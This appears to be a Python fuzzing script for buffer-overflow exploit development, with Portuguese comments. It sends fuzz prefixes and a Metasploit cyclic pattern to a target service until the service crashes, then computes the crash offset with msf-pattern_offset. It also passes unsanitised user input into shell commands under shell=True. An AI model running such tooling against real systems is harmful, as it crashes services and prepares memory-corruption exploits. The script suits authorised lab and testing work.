#!/usr/bin/python

import argparse
import socket
import subprocess

# Configurar o argparse
parser = argparse.ArgumentParser(description="Enviar padrão de teste para um servidor e encontrar o offset de crash.")
parser.add_argument("client_ip", type=str, help="O endereço IP do cliente")
parser.add_argument("client_port", type=int, help="A porta do cliente")
parser.add_argument("msf_bytes", type=str, help="Quantidade de bytes para o msf-pattern")

# Analisar os argumentos
args = parser.parse_args()

# Lista de Fuzz e Payload
with open("fuzz.txt", "r") as file:
        fuzzing_strings = file.read().splitlines() 

# Variáveis de entrada
client_ip = args.client_ip
client_port = args.client_port
command = f"msf-pattern_create -l {args.msf_bytes}"

# Conexão
try:
    for fuzz_str in fuzzing_strings:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(5)
        client.connect((client_ip, client_port))
        
        payload = "command "
        payload += fuzz_str    
        payload += subprocess.run(command, capture_output=True, text=True, shell=True).stdout    
        client.send(payload.encode())
        
        try:
            # Verificar resposta do servidor
            response = client.recv(1024)
            print(f"Enviado Prefixo de Payload: {fuzz_str}")
            if not response:
                break
        except socket.timeout:
            break
        finally:
            client.close()


except ConnectionResetError:
    print(f"Reset Error!")

# Offset - Conversão de Hex Int
hex_offset = input("Digite aqui o número que apareceu no Debugger: ")
command2 = f"msf-pattern_offset -q {hex_offset}"
dec_offset = subprocess.run(command2, capture_output=True, text=True, shell=True).stdout
print(f"\n {dec_offset}")